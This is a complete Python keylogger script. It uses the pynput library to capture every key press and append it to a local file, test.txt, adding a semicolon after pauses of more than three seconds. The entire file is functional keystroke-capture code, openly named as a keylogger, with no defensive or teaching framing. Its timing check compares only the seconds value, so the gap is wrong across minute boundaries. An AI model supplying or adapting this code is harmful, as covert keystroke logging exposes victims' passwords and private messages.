#!/bin/python


import datetime
from pynput import keyboard


class Keylogger:
    def __init__(self):
        self.last_time = int(datetime.datetime.now().strftime('%S'))
        with keyboard.Listener(
                on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        self.write_to_log(key)

    def write_to_log(self, key):
        with open('test.txt', 'a') as log_file:
            now = int(datetime.datetime.now().strftime('%S'))
            diff_time = now - self.last_time
            print(diff_time)
            # if any key hasn't been pressed in the last three seconds, write a semicolon to the file for better outline
            if diff_time > 3:
                log_file.write(';')
                string_key = str(key)
                string_key = string_key.replace("'", "")
                log_file.write(string_key)
            else:
                string_key = str(key)
                string_key = string_key.replace("'", "")
                log_file.write(string_key)
            log_file.close()
            self.last_time = int(datetime.datetime.now().strftime('%S'))


if __name__ == '__main__':
    test = Keylogger()
